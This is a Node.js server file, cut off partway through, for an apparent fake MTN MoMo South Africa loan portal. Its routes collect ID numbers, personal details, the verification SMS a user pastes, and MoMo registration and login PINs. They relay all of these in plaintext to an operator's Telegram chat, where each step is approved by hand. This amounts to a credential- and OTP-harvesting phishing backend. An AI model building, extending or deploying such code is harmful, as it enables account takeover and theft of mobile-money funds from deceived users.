// ============================================================
// server.js – MTN MoMo South Africa  (v7.4 – SMS-paste)
// PostgreSQL-backed · User pastes full SMS · Admin confirms
// ============================================================
'use strict';

require('dotenv').config();
const express      = require('express');
const fetch        = require('node-fetch');
const cors         = require('cors');
const path         = require('path');
const fs           = require('fs');
const helmet       = require('helmet');
const compression  = require('compression');
const cookieParser = require('cookie-parser');
const jwt          = require('jsonwebtoken');
const rateLimit    = require('express-rate-limit');
const PDFDocument  = require('pdfkit');
const db           = require('./db');

let TNC_VERSION = '1.0';
let TNC_EFFECTIVE = '2026-01-01';
let TERMS_TEXT = 'Terms & Conditions text not configured.';
try {
    const terms = require('./terms');
    TNC_VERSION   = terms.TNC_VERSION   || TNC_VERSION;
    TNC_EFFECTIVE = terms.TNC_EFFECTIVE || TNC_EFFECTIVE;
    TERMS_TEXT    = terms.TERMS_TEXT    || TERMS_TEXT;
} catch (e) {
    console.warn('⚠️  backend/terms.js not found — using placeholder T&C');
}

const app = express();
app.set('trust proxy', 1);

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));
app.use(compression());
app.use(cors({ origin: true, credentials: true }));
app.use(cookieParser(process.env.SESSION_SECRET || 'momo-secret-change-me'));
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const SESSION_SECRET = process.env.SESSION_SECRET || 'momo-secret-change-me';
const IS_PROD = process.env.NODE_ENV === 'production';

const RATE_LIMIT_MESSAGE = 'You have exceeded the trial limit. Please try again in 5 minutes.';
const RATE_WINDOW_MS = 5 * 60 * 1000;

function makeLimiter(max, keyGen) {
    return rateLimit({
        windowMs: RATE_WINDOW_MS, max: max,
        standardHeaders: true, legacyHeaders: false,
        keyGenerator: keyGen || ((req) => req.ip),
        handler: (req, res) => {
            res.status(429).json({ ok: false, code: 'RATE_LIMITED', retryAfterSeconds: 300, error: RATE_LIMIT_MESSAGE });
        }
    });
}
const globalLimiter     = makeLimiter(300);
const registerLimiter   = makeLimiter(5);
const submitStepLimiter = makeLimiter(30, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
const smsLimiter        = makeLimiter(10, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
app.use('/api/', globalLimiter);

console.log('═══════════════════════════════════════');
console.log('🚀 Server starting... (v7.4 / SMS-paste)');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
console.log('   DB:', process.env.DATABASE_URL ? 'set' : 'MISSING');
console.log('═══════════════════════════════════════');

const ACCOUNT_TYPES = {
    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true,  description: 'Standard MoMo account' },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true,  description: 'Higher limits account' },
    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false, description: 'Basic MoMo account (no ID required)' }
};

const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
const LEGACY_STEPS = ['application', 'sms', 'pin', 'otp'];

const REG_STATUS = {
    IDLE: 'idle',
    PENDING: 'pending_review',
    SMS_PENDING: 'sms_pending',
    SMS_SUBMITTED: 'sms_submitted',
    SMS_VERIFIED: 'sms_verified',
    PIN_PENDING: 'pin_pending',
    COMPLETED: 'completed',
    REJECTED: 'rejected'
};

const applications  = {};
const registrations = {};

function saveApp(applicationId) {
    const app_ = applications[applicationId];
    if (!app_) return;
    db.saveApplication(app_).catch(e => console.error('saveApp error:', e.message));
}
function saveApps() {
    Object.keys(applications).forEach(id => saveApp(id));
}
function saveRegs() {
    Object.keys(registrations).forEach(regId => {
        db.saveRegistration(regId, registrations[regId]).catch(e => console.error('saveRegs error:', e.message));
    });
}
async function loadAll() {
    try {
        const apps = await db.loadAllApplications();
        Object.assign(applications, apps);
        console.log(`📂 Loaded ${Object.keys(applications).length} applications from Postgres`);
        const regs = await db.loadAllRegistrations();
        Object.assign(registrations, regs);
        console.log(`📂 Loaded ${Object.keys(registrations).length} registrations from Postgres`);
    } catch (e) {
        console.error('Load error:', e.message);
        throw e;
    }
}

function audit(event, data) {
    data = data || {};
    const entry = Object.assign({ ts: new Date().toISOString(), event: event }, data);
    db.saveAudit(event, data).catch(e => console.error('Audit error:', e.message));
    console.log(JSON.stringify(entry));
}

function esc(t) { return t === null || t === undefined ? '' : String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
function code(t) { return '<code>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</code>'; }
function pre(t) { return '<pre>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</pre>'; }
function fmt(n) { return (Number(n) || 0).toLocaleString(); }
function monthlyRepayment(p, m) { return (!p || !m) ? 0 : Math.ceil(p / m); }

function ensureSteps(app_) {
    if (!app_.steps) app_.steps = {};
    STEP_ORDER.forEach(k => { if (!(k in app_.steps)) app_.steps[k] = 'idle'; });
    return app_.steps;
}
function readStep(app_, step) {
    if (app_.steps && step in app_.steps) return app_.steps[step];
    if (step in app_) return app_[step];
    return 'idle';
}
function writeStep(app_, step, value) {
    if (app_.steps && step in app_.steps) app_.steps[step] = value;
    if (step in app_) app_[step] = value;
    if (step === 'qualification') {
        app_.qualification = (value === 'approved') ? 'qualified' : (value === 'rejected') ? 'unqualified' : value;
    }
}
function resetStep(app_, step) {
    writeStep(app_, step, 'idle');
    if (step === 'loan') app_.loanData = null;
    if (step === 'personal') app_.personalData = null;
    if (step === 'employment') app_.employmentData = null;
    if (step === 'guarantor') app_.guarantorData = null;
    if (step === 'momologin') { app_.loginPin = null; app_.momoLoginData = null; }
}

function issueSession(res, applicationId) {
    const token = jwt.sign({ id: applicationId }, SESSION_SECRET, { expiresIn: '7d' });
    res.cookie('momoSession', token, { httpOnly: true, sameSite: 'lax', secure: IS_PROD, maxAge: 7 * 24 * 60 * 60 * 1000 });
}
function readSession(req) {
    try { const raw = req.cookies && req.cookies.momoSession; return raw ? jwt.verify(raw, SESSION_SECRET) : null; }
    catch (e) { return null; }
}
function guardAppId(req, res, next) {
    const id = req.params.applicationId;
    const session = readSession(req);
    if (session && session.id !== id) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
    next();
}

function validateSAID(id) {
    if (!id) return { ok: false, reason: 'ID number is required.' };
    const clean = String(id).replace(/\s/g, '');
    if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };
    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;
    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) return { ok: false, reason: 'Invalid date of birth in ID.' };
    const now = new Date();
    let age = now.getFullYear() - year;
    const m = now.getMonth() - (mm - 1);
    if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    let sum = 0, alt = false;
    for (let i = clean.length - 1; i >= 0; i--) {
        let n = parseInt(clean[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };
    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';
    return { ok: true, age: age, gender: gender, citizenship: citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
}

async function tgSend(text, buttons) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG sent (${result.result && result.result.message_id})`);
        else console.error(`❌ TG: ${result.description}`);
        return result;
    } catch (e) { console.error('❌ TG error:', e.message); return { ok: false }; }
}
function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}
function buildRegistrationReviewMessage(app_, idCheck) {
    const type = ACCOUNT_TYPES[app_.accountType];
    const tnc = app_.tncAccepted || {};
    return '🆕 <b>NEW REGISTRATION — REVIEW REQUIRED</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 App ID: ' + code(app_.applicationId) + '\n\n' +
        '<b>👤 APPLICANT</b>\n' +
        'Name:  ' + esc(app_.fullName || 'N/A') + '\n' +
        'Phone: ' + code('+27' + (app_.phone || '')) + '\n' +
        'Email: ' + code(app_.email || '') + '\n' +
        'ID:    ' + code(app_.momoRegistration && app_.momoRegistration.idNumber ? app_.momoRegistration.idNumber : 'N/A') + '\n' +
        'DOB:   ' + code(app_.dob || 'N/A') + '\n' +
        (idCheck.ok ? 'Age:   ' + idCheck.age + ' · ' + idCheck.gender + '\nCitizenship: ' + idCheck.citizenship + '\n' : '') +
        '\n<b>💳 ACCOUNT TYPE CLAIMED</b>\n' +
        type.icon + ' <b>' + type.name + '</b> — ' + esc(type.description) + '\n\n' +
        '<b>📊 LIMITS THAT WILL APPLY</b>\n' +
        'Daily Cash:  R ' + fmt(type.dailyCash) + '\n' +
        'Monthly Cap: R ' + fmt(type.monthlyCap) + '\n' +
        'Max Loan:    <b>R ' + fmt(type.maxLoan) + '</b>\n' +
        'Min Loan:    R ' + fmt(type.minLoan) + '\n\n' +
        '<b>📜 COMPLIANCE</b>\n' +
        'T&C: v' + (tnc.version || '?') + '\n' +
        'IP: ' + (tnc.ip || 'N/A') + '\n\n' +
        '✅ <b>Approve → request SMS from user?</b>\n' +
        '❌ <b>NO → registration rolled back</b>';
}
function buildPinApprovalMessage(app_) {
    return '🔐 <b>MoMo PIN VERIFICATION</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
        '📱 ' + code('+27' + (app_.phone || '')) + '\n' +
        '💳 ' + esc((ACCOUNT_TYPES[app_.accountType] || {}).name || 'N/A') + '\n\n' +
        '<b>🔑 PIN SET BY USER</b>\n' +
        '<code>' + esc(app_.regPin || '') + '</code>\n\n' +
        'SMS verified: ✅\n' +
        'Set at: ' + (app_.regPinSetAt ? new Date(app_.regPinSetAt).toLocaleString('en-ZA') : 'N/A') + '\n\n' +
        '✅ <b>YES → registration complete</b>\n' +
        '❌ <b>NO → user re-enters PIN</b>';
}
function buildSmsApprovalMessage(app_) {
    const type = ACCOUNT_TYPES[app_.accountType] || {};
    return '📩 <b>USER SUBMITTED SMS</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 App ID: ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
        '📱 ' + code('+27' + (app_.phone || '')) + '\n' +
        '💳 ' + esc(type.name || 'N/A') + '\n\n' +
        '<b>📨 SMS PASTED BY USER</b>\n' +
        pre(app_.regUserSms || '') + '\n' +
        'Received: ' + (app_.regSmsSubmittedAt ? new Date(app_.regSmsSubmittedAt).toLocaleString('en-ZA') : 'N/A') + '\n\n' +
        '<b>🔎 VERIFY</b>\n' +
        '☐ SMS is from MTN\n' +
        '☐ Contains valid verification code\n' +
        '☐ Not expired\n\n' +
        '✅ <b>YES → confirm SMS &amp; proceed to PIN</b>\n' +
        '❌ <b>NO → user re-pastes SMS</b>';
}
function buildStepMessage(step, app_, type, data) {
    const header = '🆔 ' + code(app_.applicationId) + '\n';
    if (step === 'loan') {
        const monthly = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
        const required = Math.ceil(data.loanAmount * 0.20);
        const effectiveRequired = Math.min(required, type.monthlyCap);
        return '📋 <b>LOAN REQUEST (STEP 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n' + header +
            '\n<b>💳 ACCOUNT</b>\n' + type.icon + ' <b>' + type.name + '</b> (max R ' + fmt(type.maxLoan) + ')\n\n' +
            '<b>💰 LOAN</b>\nType: ' + esc(data.loanType) + '\nAmount: <b>R ' + fmt(data.loanAmount) + '</b>\n' +
            'Term: ' + esc(data.loanTerm) + '\nMonthly: <b>R ' + fmt(monthly) + '</b>\nPurpose: ' + esc(data.loanPurpose) + '\n\n' +
            '<b>📊 QUALIFICATION (20% rule)</b>\nEffective required: <b>R ' + fmt(effectiveRequired) + '</b>\n\n' +
            '✅ YES / ❌ NO — user returns to Step 1 if NO';
    }
    if (step === 'personal') return '👤 <b>PERSONAL (STEP 2/6)</b>\n' + header + 'Name: ' + esc(data.firstName) + ' ' + esc(data.lastName) + '\nPhone: ' + code('+27' + data.phone) + '\nEmail: ' + esc(data.email) + '\n\n✅ YES / ❌ NO';
    if (step === 'employment') return '💼 <b>EMPLOYMENT (STEP 3/6)</b>\n' + header + 'Employment: ' + esc(data.employment) + '\nIncome: R ' + fmt(data.annualIncome) + '\nKin: ' + esc(data.kinName) + ' ' + code('+27' + data.kinPhone) + '\n\n✅ YES / ❌ NO';
    if (step === 'guarantor') return '🤝 <b>GUARANTOR (STEP 4/6)</b>\n' + header + 'Name: ' + esc(data.guarantorName) + '\nPhone: ' + code('+27' + data.guarantorPhone) + '\nRelation: ' + esc(data.guarantorRelation) + '\n\n✅ YES / ❌ NO';
    if (step === 'momologin') {
        const pinStr = (data.loginMethod === 'pin' && data.pin) ? code(data.pin) : '🔒 Biometric';
        return '🔐 <b>MOMO LOGIN (STEP 5/6)</b>\n' + header + 'Phone: ' + code('+27' + data.phone) + '\nMethod: ' + esc(data.loginMethod || 'pin') + '\nPIN: ' + pinStr + '\n\n✅ YES / ❌ NO';
    }
    if (step === 'qualification') {
        const loanAmount = app_.loanAmount || 0;
        const months = parseInt(app_.loanTerm) || 12;
        const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
        return '📊 <b>FINAL QUALIFICATION (STEP 6/6)</b>\n' + header +
            'Applicant: ' + esc(app_.firstName || '') + ' ' + esc(app_.lastName || '') + '\n' +
            'Amount: <b>R ' + fmt(loanAmount) + '</b>\nMonthly: <b>R ' + fmt(monthly) + '</b>\n\n' +
            '✅ YES / ❌ NO';
    }
    return 'Step "' + step + '" pending for ' + code(app_.applicationId);
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTICS
// ═══════════════════════════════════════════════════════════
app.get('/health', async (req, res) => {
    let dbOk = false;
    try { const r = await db.pool.query('SELECT 1'); dbOk = r.rowCount === 1; } catch (e) { dbOk = false; }
    res.json({ status: 'ok', version: '7.4', uptime: process.uptime(), database: dbOk ? 'connected' : 'unreachable', applications: Object.keys(applications).length });
});
app.get('/api/telegram-debug', async (req, res) => {
    const result = { tokenSet: !!BOT_TOKEN, chatIdSet: !!CHAT_ID };
    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); } catch (e) { result.getMeError = e.message; }
    try { result.testSend = await tgSend('🧪 <b>Test</b>', null); } catch (e) { result.testSendError = e.message; }
    res.json(result);
});
app.get('/api/account-types', (req, res) => res.json({ ok: true, types: ACCOUNT_TYPES }));
app.get('/api/terms', (req, res) => res.json({ ok: true, version: TNC_VERSION, effective: TNC_EFFECTIVE, text: TERMS_TEXT }));

// ═══════════════════════════════════════════════════════════
// REGISTRATION
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo', registerLimiter, async (req, res) => {
    try {
        const body = req.body || {};
        const applicationId = body.applicationId;
        const idNumber = body.idNumber;
        const accountType = body.accountType;
        const phone = body.phone;
        const email = body.email;
        const fullName = body.fullName;
        const dobProvided = body.dob;
        const tncAccepted = body.tncAccepted;

        if (!applicationId || !idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Missing required fields.' });
        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });
        if (!phone || !/^\d{9}$/.test(String(phone))) return res.status(400).json({ ok: false, error: 'Valid 9-digit mobile number required.' });
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email))) return res.status(400).json({ ok: false, error: 'Valid email address required.' });
        if (!tncAccepted || tncAccepted !== true) return res.status(400).json({ ok: false, error: 'You must read and accept the Terms & Conditions to continue.' });

        const type = ACCOUNT_TYPES[accountType];
        let idCheck = { ok: true };
        if (type.requiresId) {
            idCheck = validateSAID(idNumber);
            if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
        }
        const derivedDob = idCheck.ok && idCheck.dob ? idCheck.dob : null;
        if (type.requiresId && dobProvided && derivedDob) {
            const norm = (s) => String(s || '').slice(0, 10);
            if (norm(dobProvided) !== norm(derivedDob)) return res.status(400).json({ ok: false, error: 'Date of birth does not match the SA ID number.' });
        }

        if (!applications[applicationId]) applications[applicationId] = { applicationId: applicationId, createdAt: new Date().toISOString() };
        ensureSteps(applications[applicationId]);

        applications[applicationId].momoRegistration = {
            idNumber: type.requiresId ? idNumber : null,
            dob: derivedDob || dobProvided || null,
            accountType: accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            phone: phone, email: email, fullName: fullName || null,
            idDetails: idCheck.ok && type.requiresId ? { age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob } : null,
            registeredAt: new Date().toISOString()
        };
        applications[applicationId].isRegistered = true;
        applications[applicationId].accountType = accountType;
        applications[applicationId].accountMaxLoan = type.maxLoan;
        applications[applicationId].phone = phone;
        applications[applicationId].email = email;
        applications[applicationId].fullName = fullName || null;
        applications[applicationId].dob = derivedDob || dobProvided || null;
        applications[applicationId].tncAccepted = {
            accepted: true, version: TNC_VERSION, effective: TNC_EFFECTIVE,
            timestamp: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
            userAgent: (req.headers['user-agent'] || '').slice(0, 200)
        };
        applications[applicationId].personalData = applications[applicationId].personalData || { firstName: null, lastName: null, phone: phone, email: email };
        applications[applicationId].registrationStatus = REG_STATUS.PENDING;
        applications[applicationId].registrationHistory = applications[applicationId].registrationHistory || [];
        applications[applicationId].registrationHistory.push({ at: new Date().toISOString(), event: 'submitted', by: 'user' });
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApp(applicationId);

        issueSession(res, applicationId);
        audit('registration_submitted', { applicationId: applicationId, accountType: accountType, phone: phone, email: email });

        askApproval(buildRegistrationReviewMessage(applications[applicationId], idCheck), 'registration', applicationId);

        res.json({
            ok: true, accountType: accountType, accountName: type.name, phone: phone, email: email,
            dob: derivedDob || dobProvided || null,
            tncVersion: TNC_VERSION,
            registrationStatus: REG_STATUS.PENDING,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            message: type.name + ' submitted for verification.'
        });
    } catch (e) {
        console.error('Registration error:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// REGISTRATION VERIFICATION
// ═══════════════════════════════════════════════════════════
app.get('/api/registration/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    res.json({
        ok: true,
        applicationId: app_.applicationId,
        status: app_.registrationStatus || REG_STATUS.IDLE,
        accountType: app_.accountType || null,
        accountName: (app_.momoRegistration || {}).accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        rejectionReason: app_.rejectionReason || null
    });
});

// ✅ NEW: User pastes full SMS. Admin confirms via Telegram.
app.post('/api/registration/submit-sms', smsLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const sms = (req.body || {}).sms;
        if (!applicationId || !sms) return res.status(400).json({ ok: false, error: 'Missing fields.' });
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.registrationStatus !== REG_STATUS.SMS_PENDING) {
            return res.status(400).json({ ok: false, error: 'Not awaiting SMS.' });
        }
        const smsTrim = String(sms).trim();
        if (smsTrim.length < 10) {
            return res.status(400).json({ ok: false, error: 'Please paste the full SMS you received.' });
        }
        if (smsTrim.length > 2000) {
            return res.status(400).json({ ok: false, error: 'SMS is too long.' });
        }

        app_.regUserSms = smsTrim;
        app_.regSmsSubmittedAt = new Date().toISOString();
        app_.registrationStatus = REG_STATUS.SMS_SUBMITTED;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'sms_submitted_by_user' });
        app_.updatedAt = new Date().toISOString();
        saveApp(applicationId);

        audit('registration_sms_submitted', { applicationId: applicationId });

        askApproval(buildSmsApprovalMessage(app_), 'reg_sms', applicationId);

        res.json({ ok: true, status: REG_STATUS.SMS_SUBMITTED, next: 'awaiting-admin' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/set-pin', async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const pin = (req.body || {}).pin;
        if (!applicationId || !pin) return res.status(400).json({ ok: false, error: 'Missing fields.' });
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.registrationStatus !== REG_STATUS.SMS_VERIFIED) return res.status(400).json({ ok: false, error: 'SMS not verified yet.' });
        if (!/^\d{5}$/.test(String(pin))) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
        app_.regPin = String(pin);
        app_.regPinSetAt = new Date().toISOString();
        app_.registrationStatus = REG_STATUS.PIN_PENDING;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_set' });
        app_.updatedAt = new Date().toISOString();
        saveApp(applicationId);
        askApproval(buildPinApprovalMessage(app_), 'reg_pin', applicationId);
        res.json({ ok: true, status: REG_STATUS.PIN_PENDING });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/reset', async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        app_.registrationStatus = REG_STATUS.IDLE;
        app_.regUserSms = null;
        app_.regPin = null;
        app_.rejectionReason = null;
        app_.registrationHistory = app_.registrationHistory || [];
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'user_reset_registration' });
        saveApp(applicationId);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// UNIFIED STEP SUBMISSION
// ═══════════════════════════════════════════════════════════
app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const step = (req.body || {}).step;
        const data = (req.body || {}).data || {};
        if (!applicationId || !step) return res.status(400).json({ ok: false, error: 'Missing applicationId or step.' });
        if (STEP_ORDER.indexOf(step) === -1) return res.status(400).json({ ok: false, error: 'Invalid step: ' + step });

        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });

        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, code: 'NOT_REGISTERED', error: 'Application not found.' });
        if (!app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'You must register on MoMo before applying.' });
        }
        if (app_.registrationStatus !== REG_STATUS.COMPLETED) {
            return res.status(403).json({ ok: false, code: 'REGISTRATION_INCOMPLETE', error: 'Registration not yet verified.' });
        }

        const type = ACCOUNT_TYPES[app_.accountType];
        ensureSteps(app_);

        const idx = STEP_ORDER.indexOf(step);
        if (idx > 0) {
            const prev = STEP_ORDER[idx - 1];
            if (app_.steps[prev] !== 'approved') {
                return res.status(400).json({ ok: false, error: 'Previous step "' + prev + '" is not approved yet.' });
            }
        }

        if (step === 'loan') {
            if (!data.loanType || !data.loanAmount || !data.loanTerm || !data.loanPurpose) return res.status(400).json({ ok: false, error: 'Complete all loan fields.' });
            if (data.loanAmount < type.minLoan) return res.status(400).json({ ok: false, error: 'Minimum loan for ' + type.name + ' is R ' + fmt(type.minLoan) + '.' });
            if (data.loanAmount > type.maxLoan) return res.status(400).json({ ok: false, error: type.name + ' allows a maximum loan of R ' + fmt(type.maxLoan) + '.' });
            app_.loanType = data.loanType; app_.loanAmount = data.loanAmount;
            app_.loanTerm = data.loanTerm; app_.loanPurpose = data.loanPurpose;
            app_.monthlyRepayment = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
            app_.loanData = { loanType: data.loanType, loanAmount: data.loanAmount, loanTerm: data.loanTerm, loanPurpose: data.loanPurpose };
        }
        if (step === 'personal') {
            if (!data.firstName || !data.lastName || !data.phone || !data.email) return res.status(400).json({ ok: false, error: 'Complete all personal fields.' });
            app_.firstName = data.firstName; app_.lastName = data.lastName;
            app_.phone = data.phone; app_.email = data.email;
            app_.personalData = { firstName: data.firstName, lastName: data.lastName, phone: data.phone, email: data.email };
        }
        if (step === 'employment') {
            if (!data.employment || data.annualIncome == null || !data.kinName || !data.kinPhone) return res.status(400).json({ ok: false, error: 'Complete all employment fields.' });
            app_.employment = data.employment; app_.annualIncome = data.annualIncome;
            app_.kinName = data.kinName; app_.kinPhone = data.kinPhone;
            app_.employmentData = { employment: data.employment, annualIncome: data.annualIncome, kinName: data.kinName, kinPhone: data.kinPhone };
        }
        if (step === 'guarantor') {
            if (!data.guarantorName || !data.guarantorPhone || !data.guarantorRelation) return res.status(400).json({ ok: false, error: 'Complete all guarantor fields.' });
            if (app_.phone && data.guarantorPhone === app_.phone) return res.status(400).json({ ok: false, error: 'Guarantor phone cannot be your own.' });
            app_.guarantorName = data.guarantorName; app_.guarantorPhone = data.guarantorPhone;
            app_.guarantorRelation = data.guarantorRelation;
            app_.guarantorData = { guarantorName: data.guarantorName, guarantorPhone: data.guarantorPhone, guarantorRelation: data.guarantorRelation };
        }
        if (step === 'momologin') {
            if (!data.phone) return res.status(400).json({ ok: false, error: 'Phone required.' });
            if (app_.phone && data.phone !== app_.phone) return res.status(400).json({ ok: false, error: 'Phone must match your registered phone.' });
            if (data.loginMethod === 'pin' && (!data.pin || !/^\d{5}$/.test(data.pin))) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
            app_.loginPhone = data.phone;
            app_.loginPin = (data.loginMethod === 'pin') ? data.pin : null;
            app_.loginMethod = data.loginMethod || 'pin';
            app_.deviceInfo = data.deviceInfo || null;
            app_.momoLoginData = { phone: data.phone, pin: app_.loginPin, loginMethod: app_.loginMethod, deviceInfo: data.deviceInfo };
        }
        if (step === 'qualification') {
            const required = Math.ceil((app_.loanAmount || 0) * 0.20);
            app_.qualificationRequired = Math.min(required, type.monthlyCap);
        }

        app_.steps[step] = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApp(applicationId);

        audit('step_submitted', { id: applicationId, step: step, accountType: app_.accountType });
        askApproval(buildStepMessage(step, app_, type, data), step, applicationId);
        res.json({ ok: true, status: 'pending', step: step });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// AGREEMENT & PDF
// ═══════════════════════════════════════════════════════════
app.get('/api/agreement/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Months';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;
    const tnc = app_.tncAccepted || {};
    const agreement =
        'MTN MOMO SOUTH AFRICA – LOAN AGREEMENT\n' +
        '================================================\n\n' +
        'Application ID : ' + app_.applicationId + '\n' +
        'Generated      : ' + new Date().toLocaleString('en-ZA') + '\n' +
        'T&C Version    : ' + (tnc.version || TNC_VERSION) + '\n\n' +
        'BORROWER\n--------\n' +
